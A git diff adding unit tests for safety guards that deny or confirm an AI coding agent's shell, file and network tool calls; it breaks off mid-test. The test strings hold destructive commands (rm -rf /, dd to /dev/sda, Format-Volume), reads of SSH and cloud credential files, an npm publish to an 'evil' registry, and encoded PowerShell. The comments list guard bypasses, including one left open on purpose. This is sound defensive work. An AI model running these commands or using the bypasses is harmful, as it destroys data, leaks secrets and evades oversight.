@@ -730,10 +730,42 @@ test('evaluateGuards returns null when no guard is active (allow)', () => {
 
 test('readonly guard denies file-mutating tools when active', () => {
   const active = new Set([guardId('readonly')])
-  for (const name of ['write', 'create', 'edit', 'str_replace_editor']) {
+  // `write` and `edit` are the real dsh-tool-fs registered tool names. There is
+  // no standalone `create` tool in any shipped DSH version: `create` is only a
+  // `command` ENUM VALUE of `str_replace_editor`, so naming it here matched
+  // nothing and quietly narrowed the preset's coverage.
+  for (const name of ['write', 'edit']) {
     const hit = evaluateGuards(active, name, { file_path: 'x' })
     assert.equal(hit?.id, guardId('readonly'))
     assert.equal(hit?.decision.kind, 'deny')
+  }
+})
+
+test('readonly guard denies the mutating str_replace_editor commands but not `view`', () => {
+  const active = new Set([guardId('readonly')])
+  // str_replace_editor is ONE tool whose `command` parameter selects the action
+  // (enum: view | create | str_replace | insert). Denying the tool by name alone
+  // also denied `view`, so read-only mode blocked the model from READING a file
+  // through the editor — the opposite of the preset's purpose.
+  for (const command of ['create', 'str_replace', 'insert']) {
+    const hit = evaluateGuards(active, 'str_replace_editor', { command, path: 'x' })
+    assert.equal(hit?.id, guardId('readonly'), command)
+    assert.equal(hit?.decision.kind, 'deny', command)
+  }
+  assert.equal(
+    evaluateGuards(active, 'str_replace_editor', { command: 'view', path: 'x' }),
+    null,
+    'view is read-only and must pass through readonly mode',
+  )
+})
+
+test('readonly guard fails closed on a str_replace_editor call with no recognizable command', () => {
+  const active = new Set([guardId('readonly')])
+  // A safety preset must not widen when it cannot classify the call: an absent,
+  // empty, or unknown `command` denies rather than passing through.
+  for (const args of [{ path: 'x' }, { command: '', path: 'x' }, { command: 'wat', path: 'x' }, {}]) {
+    const hit = evaluateGuards(active, 'str_replace_editor', args)
+    assert.equal(hit?.decision.kind, 'deny', JSON.stringify(args))
   }
 })
 
@@ -822,9 +854,32 @@ test('no-destructive-git leaves safe git alone', () => {
 test('no-network asks on network tools and outbound shell', () => {
   const active = new Set([guardId('no-network')])
   assert.equal(evaluateGuards(active, 'web_search', {})?.decision.kind, 'ask')
-  assert.equal(evaluateGuards(active, 'read_page', { url: 'http://x' })?.decision.kind, 'ask')
+  // dsh-tool-web registers `web_fetch` (its URL-fetching tool) — there has never
+  // been a `read_page` tool in 0.1.0 through 0.1.5, so the name this preset
+  // listed matched nothing and the model could fetch any URL unguarded.
+  assert.equal(evaluateGuards(active, 'web_fetch', { url: 'http://x' })?.decision.kind, 'ask')
   assert.equal(evaluateGuards(active, 'bash', { command: 'curl http://x' })?.decision.kind, 'ask')
   assert.equal(evaluateGuards(active, 'bash', { command: 'npm publish' })?.decision.kind, 'ask')
+})
+
+test('no-network covers pwsh outbound commands too', () => {
+  const active = new Set([guardId('no-network')])
+  // pwsh is a real registered tool (dsh-tool-pwsh) whose `command` parameter
+  // carries PowerShell source. Gating shell content on `bash` alone let every
+  // outbound action run unconfirmed through PowerShell.
+  for (const command of [
+    'Invoke-WebRequest https://x', 'iwr https://x', 'Invoke-RestMethod https://x',
+    'irm https://x', 'curl http://x', 'git push origin main', 'npm publish',
+    'Start-BitsTransfer -Source https://x -Destination y',
+  ]) {
+    assert.equal(
+      evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'ask', command,
+    )
+  }
+  // `sc query spooler` on pwsh must not be mistaken for an outbound action, and
+  // a cmdlet name mentioned in prose is the documented cheap false positive.
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-Content firmware.log' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: '$firmware = 1' }), null)
 })
 
 test('deny wins over ask when both match one call', () => {
@@ -847,6 +902,364 @@ test('evaluateGuards normalizes a non-object arguments value to {}', () => {
   assert.equal(evaluateGuards(active, 'bash', null), null)
   assert.equal(evaluateGuards(active, 'bash', undefined), null)
   assert.equal(evaluateGuards(active, 'bash', 'rm -rf /'), null)
+})
+
+// ---- pwsh parity: every shell-content guard must gate PowerShell too ----
+// `bash` and `pwsh` are the two registered shell tools (dsh-tool-bash,
+// dsh-tool-pwsh) and both carry their source in a `command` parameter. Gating
+// on `name === 'bash'` alone left all five presets wide open to PowerShell.
+
+test('readonly guard denies PowerShell file-write cmdlets and aliases', () => {
+  const active = new Set([guardId('readonly')])
+  // Set-Content/Add-Content/Out-File/New-Item write files, plus the `ni` alias,
+  // which the PowerShell source registers unconditionally. `>` redirection stays
+  // out of scope, matching the documented bash rule.
+  for (const command of [
+    'Set-Content -Path x -Value y', 'set-content x y',
+    'Add-Content x y', 'Out-File x', 'New-Item x -ItemType File', 'ni x',
+    'Clear-Content x', 'Get-Process; Set-Content x y',
+  ]) {
+    const hit = evaluateGuards(active, 'pwsh', { command })
+    assert.equal(hit?.id, guardId('readonly'), command)
+    assert.equal(hit?.decision.kind, 'deny', command)
+  }
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-Content x' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-ChildItem' }), null)
+})
+
+test('readonly guard does not deny the `sc`/`ac` aliases (accepted narrow bypass)', () => {
+  // PowerShell's own InitialSessionState.cs (master) registers `sc` ->
+  // Set-Content ONLY under `#if !CORECLR`, and `ac` -> Add-Content ONLY under
+  // `#if !UNIX`. The `pwsh` tool prefers PowerShell 7 (Core, where neither
+  // alias exists) but its resolvePwshPath falls back to
+  // SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe — Windows
+  // PowerShell 5.1, which is NOT CoreCLR and DOES register `sc` -> Set-Content
+  // — and an explicit `pwshPath` config is trusted as-is. So on a 5.1 host
+  // `sc a b` writes a file that readonly will not catch.
+  //
+  // That bypass is accepted deliberately, not overlooked. Matching `sc` on the
+  // PowerShell 7 path (the overwhelmingly common case) would deny `sc query
+  // spooler`, the real read-only service-control program; matching `ac` on
+  // Linux/macOS would deny the native connect-time accounting command, also
+  // read-only. Both are DENY-path false positives — non-recoverable — traded
+  // against an ASK-path-equivalent bypass that needs a 5.1 host to reach. This
+  // is the same principle the bash side states for leaving `>` redirection
+  // unmatched.
+  const active = new Set([guardId('readonly')])
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'sc query spooler' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'ac x y' }), null)
+  // Short-name collisions must not fire from inside unrelated identifiers either.
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-Content misc.txt' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: '$nisc = 1; Write-Host $nisc' }), null)
+})
+
+test('readonly matches cmdlet names inside quoted text, as the bash side already does', () => {
+  // The PRE-EXISTING bash patterns are unanchored substring matches, so a quoted
+  // or commented mention already denies today: `echo "tee x"` and `# sed -i f`
+  // both hit READONLY_SHELL_WRITE. Matching cmdlet names the same way keeps the
+  // two shells consistent and prefers a cheap false positive on quoted text over
+  // a fail-open on a real write reached through an assignment (`$x =
+  // Set-Content …`), a pipeline, a subexpression, or the `&` call operator.
+  // Long cmdlet names need no statement anchor because they are distinctive
+  // enough on their own; only the short `ni` alias keeps one.
+  const active = new Set([guardId('readonly')])
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Write-Host "Set-Content"' })?.decision.kind, 'deny')
+  for (const command of ['$x = Set-Content a b', '& "Set-Content" a b', '$(Out-File a)', 'Get-Process | Set-Content a']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'deny', command)
+  }
+})
+
+test('protect-secrets inspects pwsh command text', () => {
+  const active = new Set([guardId('protect-secrets')])
+  for (const command of [
+    'Get-Content .env', 'cat .ssh/id_rsa', 'Get-Content C:\\keys\\id_ed25519',
+    'Get-Content $env:USERPROFILE\\.aws\\credentials',
+  ]) {
+    assert.equal(
+      evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'deny', command,
+    )
+  }
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-Content README.md' }), null)
+})
+
+test('dangerous-shell asks on destructive PowerShell cmdlets', () => {
+  const active = new Set([guardId('dangerous-shell')])
+  // Remove-Item -Recurse -Force is the PowerShell `rm -rf`; Format-Volume and
+  // Clear-Disk are the `mkfs`/raw-disk equivalents; Stop-Computer forces a
+  // machine shutdown with no clean bash analogue.
+  for (const command of [
+    'Remove-Item -Recurse -Force C:\\tmp', 'rm -Recurse -Force .\\x',
+    'del -Force -Recurse x', 'Format-Volume -DriveLetter C', 'Clear-Disk 0',
+    'Stop-Computer -Force', 'Restart-Computer -Force',
+  ]) {
+    const hit = evaluateGuards(active, 'pwsh', { command })
+    assert.equal(hit?.id, guardId('dangerous-shell'), command)
+    assert.equal(hit?.decision.kind, 'ask', command)
+  }
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Remove-Item x.txt' }), null)
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'Get-Process' }), null)
+})
+
+test('dangerous-shell still asks on the bash forms it already covered', () => {
+  const active = new Set([guardId('dangerous-shell')])
+  // Widening the shell gate must not regress the original bash coverage: the
+  // `rm -rf` family, raw-disk writes, mkfs, chmod 777 and curl|sh all still ask.
+  for (const command of ['rm -rf /tmp/x', 'dd if=/dev/zero of=/dev/sda', 'mkfs.ext4 /dev/sdb', 'chmod 777 /etc']) {
+    assert.equal(evaluateGuards(active, 'bash', { command })?.decision.kind, 'ask', command)
+  }
+})
+
+test('no-destructive-git asks on destructive git through pwsh', () => {
+  const active = new Set([guardId('no-destructive-git')])
+  // git is git on both shells, so the same command text must be gated.
+  for (const command of ['git push --force', 'git reset --hard HEAD~1', 'git clean -fd', 'git branch -D feature']) {
+    assert.equal(
+      evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'ask', command,
+    )
+  }
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'git status' }), null)
+})
+
+test('dangerous-shell asks on every verified Remove-Item alias', () => {
+  const active = new Set([guardId('dangerous-shell')])
+  // PowerShell's InitialSessionState.cs registers these aliases for
+  // Remove-Item: ri (unconditional), del (unconditional, AllScope), erase (unconditional),
+  // rd (unconditional), rm and rmdir (`#if !UNIX`). Word boundaries mean `\brm\b`
+  // does NOT match inside `rmdir`, so each alias must be listed explicitly.
+  for (const alias of ['Remove-Item', 'rm', 'del', 'ri', 'rmdir', 'erase', 'rd']) {
+    const command = `${alias} -Recurse -Force C:\\tmp`
+    const hit = evaluateGuards(active, 'pwsh', { command })
+    assert.equal(hit?.id, guardId('dangerous-shell'), command)
+    assert.equal(hit?.decision.kind, 'ask', command)
+  }
+  // The short aliases keep a statement anchor whose character class admits `=`,
+  // so a destructive delete on the right of an assignment is still caught. `rm`
+  // cannot pin that `=` here because bash's own `\brm\s+-\w*[rf]` arm also fires
+  // on `-Recurse` (lowercase `r`); `del`/`ri` are matched only by the PowerShell
+  // anchored arm, so dropping the `=` from that class fails this assertion.
+  for (const command of ['$x = del -Recurse -Force C:\\tmp', '$y = ri -Force z']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'ask', command)
+  }
+})
+
+test('dangerous-shell leaves flag-less deletes alone on pwsh, matching bash', () => {
+  const active = new Set([guardId('dangerous-shell')])
+  // `rm file.txt` passes on bash today, so a single-file delete must pass on
+  // pwsh too: the deletion aliases are flag-qualified by -Recurse/-Force.
+  for (const command of ['Remove-Item x.txt', 'del x.txt', 'rd x.txt', 'rm x.txt']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command }), null, command)
+  }
+})
+
+test('readonly guard denies every verified write-cmdlet alias', () => {
+  const active = new Set([guardId('readonly')])
+  // ni (New-Item), clc (Clear-Content) and epcsv (Export-Csv) are registered
+  // unconditionally in PowerShell's InitialSessionState.cs. They are short
+  // enough to collide with identifiers, so they keep a statement anchor: a bare
+  // `$ni = 1` assignment must NOT be denied.
+  for (const command of ['ni x', 'clc x', 'epcsv -Path x', 'Set-Content x y', 'Out-File x']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'deny', command)
+  }
+  for (const command of ['$ni = 1', '$clc = 1', '$epcsv = 2', 'Write-Host $ni']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command }), null, command)
+  }
+})
+
+test('bash commands containing a PowerShell cmdlet name are not intercepted', () => {
+  // Regression: routing BOTH shells' patterns through one undifferentiated gate
+  // applied the PowerShell patterns to bash calls too. `Set-Content` / `Out-File`
+  // / `New-Item` / `Invoke-WebRequest` are ordinary strings to grep for in a repo
+  // — this repo's own CHANGELOG contains all of them — so a read-only agent
+  // grepping for one hit a hard, non-recoverable deny on a read command. Each
+  // shell must see only its own syntax patterns.
+  const readonlyActive = new Set([guardId('readonly')])
+  for (const command of [
+    'grep -rn "Set-Content" CHANGELOG.md',
+    'rg "Out-File" README.md',
+    'find . -name "*New-Item*"',
+    'sed "s/Out-File/X/" f.txt',
+  ]) {
+    assert.equal(evaluateGuards(readonlyActive, 'bash', { command }), null, command)
+  }
+  const networkActive = new Set([guardId('no-network')])
+  for (const command of ['echo irm', 'man iwr', 'awk /Invoke-WebRequest/ f']) {
+    assert.equal(evaluateGuards(networkActive, 'bash', { command }), null, command)
+  }
+  const dangerousActive = new Set([guardId('dangerous-shell')])
+  for (const command of [
+    'grep -rn "Stop-Computer" src/',
+    'rg "Format-Volume" docs/',
+    'sed -i "s/Clear-Disk/x/" f',
+  ]) {
+    assert.equal(evaluateGuards(dangerousActive, 'bash', { command }), null, command)
+  }
+  // The bash-native destructive forms must still be caught, so the assertion
+  // above is pinning scope rather than neutering the preset. `rm -Force x` is
+  // deliberately excluded: bash's own `\brm\s+-\w*[rf]` legitimately flags it.
+  assert.equal(
+    evaluateGuards(dangerousActive, 'bash', { command: 'rm -rf /tmp/x' })?.decision.kind,
+    'ask',
+  )
+})
+
+test('pwsh still sees the shell-agnostic external commands bash covers', () => {
+  // The other half of the same regression: PowerShell runs ordinary external
+  // programs too, so bash patterns targeting external commands (tee, sed -i, dd,
+  // mkfs, chmod 777) must NOT be scoped away from pwsh. Scoping them out trades
+  // seven false positives for seven fail-opens on a deny preset. Only PowerShell's
+  // own syntax belongs in the PS_* patterns.
+  const readonlyActive = new Set([guardId('readonly')])
+  for (const command of ['tee out.txt', 'sed -i s/a/b/ f', 'dd if=x of=/dev/sda']) {
+    assert.equal(evaluateGuards(readonlyActive, 'pwsh', { command })?.decision.kind, 'deny', command)
+  }
+  const dangerousActive = new Set([guardId('dangerous-shell')])
+  for (const command of ['dd if=/dev/zero of=/dev/sda', 'mkfs.ext4 /dev/sda', 'chmod -R 777 /']) {
+    assert.equal(evaluateGuards(dangerousActive, 'pwsh', { command })?.decision.kind, 'ask', command)
+  }
+})
+
+test('dangerous-shell does not read the `-rm` flag inside docker as a delete', () => {
+  // Regression: a plain word boundary let `rm` match inside `docker run --rm`
+  // (a `-` is a word-boundary character) and `--force-rm` then supplied the
+  // `-Force` tail, so an everyday container command raised a confirmation.
+  const active = new Set([guardId('dangerous-shell')])
+  for (const command of [
+    'docker run --rm --force-rm x',
+    'Remove-Variable del -Force',
+    '$rd = 1; Write-Host $rd -Force',
+  ]) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command }), null, command)
+  }
+  assert.equal(
+    evaluateGuards(active, 'pwsh', { command: 'Remove-Item -Recurse -Force C:\\x' })?.decision.kind,
+    'ask',
+  )
+})
+
+test('dangerous-shell catches a delete continued onto the next line with a backtick', () => {
+  // PowerShell uses a trailing backtick for line continuation, so the gap between
+  // the cmdlet name and its `-Recurse`/`-Force` flag can legitimately contain an
+  // escaped newline. A gap that stopped at any newline let
+  // `Remove-Item \`\n -Recurse -Force C:\` through.
+  const active = new Set([guardId('dangerous-shell')])
+  for (const command of ['Remove-Item `\n  -Recurse -Force C:\\x', 'ri `\n -Recurse -Force x']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'ask', command)
+  }
+})
+
+test('readonly denies a short write alias on the right of an assignment', () => {
+  // `$x = Set-Content a b` was already denied because the long cmdlet names are
+  // unanchored, but the short aliases kept a statement anchor that omitted `=`, so
+  // `$dir = ni C:\tmp` — the same assignment-RHS shape — escaped. Both halves of
+  // the preset must agree on assignment coverage.
+  const active = new Set([guardId('readonly')])
+  for (const command of ['$dir = ni C:\\tmp -ItemType Directory', '$o = clc f', '$c = epcsv -Path x']) {
+    assert.equal(evaluateGuards(active, 'pwsh', { command })?.decision.kind, 'deny', command)
+  }
+})
+
+test('dangerous-shell asks on an encoded PowerShell command it cannot read', () => {
+  // `pwsh -EncodedCommand <base64 UTF-16LE>` hides the payload from every
+  // content-inspecting preset including the DENY ones, so protect-secrets could
+  // be exfiltrated as an unreadable blob. The bash analogue
+  // (`echo <b64> | base64 -d | bash`) was already caught by the `| bash` arm,
+  // leaving pwsh strictly weaker. Flagging the evasion vector itself restores
+  // parity without pretending to decode the payload.
+  const b64 = 'UgBlAG0AbwB2AGUALQBJAHQAZQBtAA=='
+  const dangerous = new Set([guardId('dangerous-shell')])
+  assert.equal(
+    evaluateGuards(dangerous, 'pwsh', { command: `pwsh -EncodedCommand ${b64}` })?.decision.kind,
+    'ask',
+  )
+  const network = new Set([guardId('no-network')])
+  assert.equal(
+    evaluateGuards(network, 'pwsh', { command: `powershell -enc ${b64}` })?.decision.kind,
+    'ask',
+  )
+  // A prefix chain (`-e`, `-en`, … `-EncodedCommand`) must not be widened by an
+  // open `-e[a-z]*` tail, which fired on every common PowerShell switch starting
+  // in `-e`: `-eq` (the equality operator), `-ErrorAction`, `-Encoding`, `-ea`.
+  // Those are everyday and would ask constantly; only the encoded-invocation
+  // prefixes should match.
+  for (const command of [
+    'pwsh -Command "if ($a -eq 1) { Write-Host hi }"',
+    'pwsh -Command "Get-Process -ErrorAction SilentlyContinue"',
+    'Get-Content data -Encoding UTF8',
+    'Get-Content x -ea SilentlyContinue',
+    'powershell -ExecutionPolicy Bypass -File x.ps1',
+    'pwsh -File script.ps1',
+  ]) {
+    assert.equal(evaluateGuards(network, 'pwsh', { command }), null, command)
+  }
+})
+
+test('protect-secrets matches Windows paths that only a backslash separator reaches', () => {
+  // The backslash support added to SECRET_PATH was previously untested: every
+  // case that looked like it pinned the change actually matched through a
+  // different arm (`\bid_ed25519\b`, `\bcredentials\b`), so deleting ALL
+  // backslash support survived the whole suite. These cases match only through
+  // the `\\` alternatives in the separator classes.
+  const active = new Set([guardId('protect-secrets')])
+  for (const args of [
+    { file_path: 'C:\\proj\\.env' },
+    { file_path: 'C:\\proj\\.env.local' },
+    { path: 'C:\\Users\\me\\.ssh\\' },
+    { command: 'Get-ChildItem C:\\Users\\me\\.ssh\\' },
+    { command: 'Get-Content C:\\proj\\.env' },
+  ]) {
+    assert.equal(
+      evaluateGuards(active, 'pwsh', args)?.decision.kind, 'deny', JSON.stringify(args),
+    )
+  }
+  for (const file_path of ['C:\\proj\\environment.txt', 'C:\\proj\\dotenv', 'C:\\proj\\sshconfig.txt']) {
+    assert.equal(evaluateGuards(active, 'read', { file_path }), null, file_path)
+  }
+})
+
+test('every shell-content guard gates both registered shell tools', async () => {
+  // Source-of-truth check: the failure mode being fixed here is a guard listing
+  // a tool name that does not exist (or omitting one that does), which fails
+  // SILENTLY — the listener installs, never matches, and the guard reads as
+  // active while enforcing nothing. Assert the shipped source names both shells
+  // through one shared set, so re-introducing a per-preset `name === 'bash'`
+  // gate fails here instead of failing open in production.
+  const { readFileSync } = await import('node:fs')
+  const src = readFileSync(new URL('../src/host/guards.ts', import.meta.url), 'utf8')
+  assert.match(
+    src,
+    /SHELL_TOOLS\s*=\s*new Set\(\['bash', 'pwsh'\]\)/,
+    'guards.ts must gate shell content through one SHELL_TOOLS set naming both bash and pwsh',
+  )
+  assert.ok(
+    !/name === 'bash'/.test(src),
+    'no preset may gate shell content on `name === \'bash\'` alone — use SHELL_TOOLS.has(name)',
+  )
+})
+
+test('the guard tool-name lists contain no name that has never shipped in DSH', async () => {
+  // `read_page` and a standalone `create` tool matched nothing in any DSH
+  // release: both were names invented against a remembered API rather than a
+  // read one. Every tool name a guard lists is a claim about the framework, so
+  // pin the claims to the names DSH actually registers, and fail when a new
+  // unmatched name appears. Verified against the installed 0.1.5-rc.2 packages
+  // plus the 0.1.1-rc.2 / 0.1.2-rc.1 tarballs.
+  const { readFileSync } = await import('node:fs')
+  const src = readFileSync(new URL('../src/host/guards.ts', import.meta.url), 'utf8')
+  const registered = new Set([
+    'bash', 'pwsh', 'write', 'edit', 'read', 'read_image', 'glob', 'grep',
+    'str_replace_editor', 'web_fetch', 'web_search', 'skill',
+  ])
+  const lists = [...src.matchAll(/(?:FILE_WRITE_TOOLS|NETWORK_TOOLS|SHELL_TOOLS)\s*=\s*new Set\(\[([^\]]*)\]\)/g)]
+  assert.ok(lists.length >= 3, 'expected the file-write, network and shell tool-name sets')
+  for (const list of lists) {
+    for (const name of (list[1] ?? '').matchAll(/'([a-z_0-9]+)'/g)) {
+      assert.ok(
+        registered.has(name[1] as string),
+        `"${name[1]}" is not a registered DSH tool name — a guard listing it enforces nothing`,
+      )
+    }
+  }
+  assert.ok(!src.includes('read_page'), 'read_page never existed in DSH; do not re-add it')
 })
 
 /**
@@ -904,6 +1317,37 @@ test('applyGuards listener denies a matching call, counts the hit, and returns t
   assert.deepEqual(hits, [guardId('readonly')])
   assert.equal(nextCalls.n, 0) // matched → did not call next()
   assert.equal((decision as { kind: string }).kind, 'deny')
+})
+
+test('applyGuards listener enforces on pwsh, not only the pure predicate', async () => {
+  // Production routes through this listener, not evaluateGuards directly, so the
+  // per-shell wiring must be proven here too: a pwsh PowerShell write is denied,
+  // while a bash command that merely MENTIONS a cmdlet name is let through. The
+  // pre-existing listener tests only exercised `write`/`read`, leaving the whole
+  // pwsh-vs-bash scope split — the core of this fix — untested end-to-end.
+  const deny = fakeGuardCtx()
+  const denyHits: string[] = []
+  applyGuards(deny.ctx, new Set([guardId('readonly')]), id => denyHits.push(id))
+  let denyNext = 0
+  const pwshWrite = await deny.listener!(
+    { name: 'pwsh', arguments: { command: 'Set-Content out.txt x' } },
+    () => { denyNext += 1; return Promise.resolve({ kind: 'allow' }) },
+  )
+  assert.deepEqual(denyHits, [guardId('readonly')])
+  assert.equal(denyNext, 0)
+  assert.equal((pwshWrite as { kind: string }).kind, 'deny')
+
+  const pass = fakeGuardCtx()
+  const passHits: string[] = []
+  applyGuards(pass.ctx, new Set([guardId('readonly')]), id => passHits.push(id))
+  let passNext = 0
+  const bashGrep = await pass.listener!(
+    { name: 'bash', arguments: { command: 'grep -rn "Set-Content" CHANGELOG.md' } },
+    () => { passNext += 1; return Promise.resolve({ kind: 'allow' }) },
+  )
+  assert.deepEqual(passHits, [])
+  assert.equal(passNext, 1) // not matched → next() ran
+  assert.equal((bashGrep as { kind: string }).kind, 'allow')
 })
 
 test('applyGuards listener passes a non-matching call through via next()', async () => {
@@ -1304,6 +1748,40 @@ test('zh and en dictionaries have identical key sets', async () => {
   const enOnly = enKeys.filter(k => !(k in dictionaries.zh))
   assert.deepEqual(zhOnly, [], `keys only in zh: ${zhOnly.join(', ')}`)
   assert.deepEqual(enOnly, [], `keys only in en: ${enOnly.join(', ')}`)
+})
+
+test('guard descriptions never advertise a tool name DSH does not register', async () => {
+  const { readFileSync } = await import('node:fs')
+  const { dictionaries } = await import('../src/client/locales.ts')
+  // The guard descriptions name the tools each preset covers, so they carry the
+  // same claim the matcher does: a tool name a guard lists. The phantom names
+  // `read_page` (no-network) and a standalone `create` (readonly) made the panel
+  // advertise coverage the matcher never delivered. Pin both dictionaries to the
+  // real registered names and reject the phantoms wherever they reappear.
+  const phantoms = ['read_page']
+  for (const dict of ['zh', 'en'] as const) {
+    for (const key of ['guard.no-network.desc', 'guard.readonly.desc']) {
+      const text = dictionaries[dict][key] ?? ''
+      for (const phantom of phantoms) {
+        assert.ok(
+          !text.includes(phantom),
+          `${dict}.${key} advertises "${phantom}", which DSH does not register`,
+        )
+      }
+    }
+    // readonly names its file tools in prose; `create` there reads as the
+    // str_replace_editor subcommand, which the matcher now judges per-command, so
+    // it is accurate. Only assert the network tools it lists are real.
+    assert.match(
+      dictionaries[dict]['guard.no-network.desc'] ?? '', /web_fetch/,
+      `${dict}.guard.no-network.desc must name the real web_fetch tool`,
+    )
+  }
+  // The shipped source must not reintroduce a phantom either.
+  const guardsSrc = readFileSync(new URL('../src/host/guards.ts', import.meta.url), 'utf8')
+  for (const phantom of phantoms) {
+    assert.ok(!guardsSrc.includes(phantom), `guards.ts reintroduces "${phantom}"`)
+  }
 })
 
 test('every dictionary key is actually referenced by a component (no dead keys)', async () => {
@@ -2045,4 +2523,122 @@ test('Panel consumes prefs/onPrefsChange props so index.tsx owns persistence', a
   assert.match(host, /writePrefs\(next\)/)
   assert.match(host, /prefs=\{prefs\}/)
   assert.match(host, /onPrefsChange=\{onPrefsChange\}/)
+})
+
+// ---- P0 hardening round: each case below was VERIFIED as a live allow
+// against evaluateGuards before the fix (probe corpus, 20 of 27 slipping
+// through). Every test names the bypass it closes.
+
+test('protect-secrets inspects grep.include and glob.pattern, not just path fields', () => {
+  // Verified live allow before the fix: the preset only read `file_path` and
+  // `path`, but grep filters files through `include` and glob targets through
+  // `pattern` (both verified against dsh-tool-fs-search's real schema). A model
+  // could read every secret file's CONTENTS via `grep {pattern:'', include:'.env'}`
+  // with the guard showing as active.
+  const active = new Set([guardId('protect-secrets')])
+  assert.equal(evaluateGuards(active, 'grep', { pattern: 'KEY', include: '.env' })?.decision.kind, 'deny')
+  assert.equal(evaluateGuards(active, 'grep', { pattern: 'x', include: '**/*.pem' })?.decision.kind, 'deny')
+  assert.equal(evaluateGuards(active, 'glob', { pattern: '**/.env' })?.decision.kind, 'deny')
+  assert.equal(evaluateGuards(active, 'glob', { pattern: 'keys/id_rsa' })?.decision.kind, 'deny')
+  // Ordinary search filters must pass.
+  assert.equal(evaluateGuards(active, 'grep', { pattern: 'TODO', include: '*.ts' }), null)
+  assert.equal(evaluateGuards(active, 'glob', { pattern: 'src/**/*.tsx' }), null)
+})
+
+test('protect-secrets matches secret names case-insensitively (Windows .ENV/.Env)', () => {
+  // Verified live allow: `cat .ENV` passed because SECRET_PATH was
+  // case-sensitive, while Windows treats .ENV and .env as the same file.
+  const active = new Set([guardId('protect-secrets')])
+  assert.equal(evaluateGuards(active, 'bash', { command: 'cat .ENV' })?.decision.kind, 'deny')
+  assert.equal(evaluateGuards(active, 'pwsh', { command: 'type .Env' })?.decision.kind, 'deny')
+  assert.equal(evaluateGuards(active, 'read', { file_path: 'secrets/ID_RSA' })?.decision.kind, 'deny')
+  // The boundary anchoring must survive the i-flag: `environment` still passes.
+  assert.equal(evaluateGuards(active, 'read', { file_path: 'src/environment.ts' }), null)
+  assert.equal(evaluateGuards(active, 'bash', { command: 'echo ENVIRONMENT' }), null)
+})
+
+test('dangerous-shell asks on long-form and uppercase rm flags', () => {
+  // Verified live allows: `rm --recursive --force /x`, `rm -RF /x`,
+  // `rm --force /x` all slipped the `\brm\s+-\w*[rf]` arm (short clustered
+  // flags only, lowercase only).
+  const active = new Set([guardId('dangerous-shell')])
+  for (const command of [
+    'rm --recursive --force /x', 'rm --force /x', 'rm -RF /x', 'rm -Rf /x',
+    'rm -r -f /x', 'rm --no-preserve-root -rf /',
+  ]) {
+    assert.equal(evaluateGuards(active, 'bash', { command })?.decision.kind, 'ask', command)
+  }
+  assert.equal(evaluateGuards(active, 'bash', { command: 'rm file.txt' }), null)
+})
+
+test('dangerous-shell asks on dd writing a block device in any argument order', () => {
+  // Verified live allow with readonly OFF: `dd of=/dev/sda if=/dev/zero` — the
+  // arm only matched `dd if=`, so putting of= first hid a raw disk write from
+  // the ask preset (it was only caught by readonly's broader dd of= arm).
+  const active = new Set([guardId('dangerous-shell')])
+  assert.equal(evaluateGuards(active, 'bash', { command: 'dd of=/dev/sda if=/dev/zero' })?.decision.kind, 'ask')
+  assert.equal(evaluateGuards(active, 'bash', { command: 'dd if=/dev/zero of=/dev/nvme0n1' })?.decision.kind, 'ask')
+  // Keep the existing conservative dd policy; hardening must not silently
+  // downgrade ordinary-file overwrites which were already confirmed.
+  assert.equal(evaluateGuards(active, 'bash', { command: 'dd if=/dev/zero of=/tmp/disk.img bs=1M count=10' })?.decision.kind, 'ask')
+})
+
+test('no-destructive-git asks on --mirror, --delete, and push behind global options', () => {
+  // Verified live allows: `git push --mirror origin`, `git push origin --delete
+  // main`, and `git -C /repo push --force` (global options between git and push
+  // broke the literal `git\s+push` adjacency).
+  const active = new Set([guardId('no-destructive-git')])
+  for (const command of [
+    'git push --mirror origin', 'git push origin --delete main',
+    'git -C /repo push --force', 'git --git-dir=/x push -f',
+  ]) {
+    assert.equal(evaluateGuards(active, 'bash', { command })?.decision.kind, 'ask', command)
+  }
+  assert.equal(evaluateGuards(active, 'bash', { command: 'git -C /repo push origin main' }), null)
+  assert.equal(evaluateGuards(active, 'bash', { command: 'git status' }), null)
+})
+
+test('no-network asks on publish behind npm global options', () => {
+  // Verified live allow: `npm --registry=http://evil publish` — the literal
+  // `npm\s+publish` adjacency broke on the interleaved global option, so the
+  // exfil path (publish to an attacker registry) ran unconfirmed.
+  const active = new Set([guardId('no-network')])
+  assert.equal(evaluateGuards(active, 'bash', { command: 'npm --registry=http://evil publish' })?.decision.kind, 'ask')
+  assert.equal(evaluateGuards(active, 'bash', { command: 'npm publish --registry=http://evil' })?.decision.kind, 'ask')
+  assert.equal(evaluateGuards(active, 'bash', { command: 'npm install' }), null)
+})
+
+test('dangerous-shell asks on PowerShell parameter-abbreviated deletes', () => {
+  // Verified live allow: `Remove-Item -Re -Fo C:\x` — PowerShell resolves any
+  // unambiguous parameter prefix, so -Re (Recurse) and -Fo (Force) are exactly
+  // as destructive as the full names the pattern required.
+  const active = new Set([guardId('dangerous-shell')])
+  for (const command of [
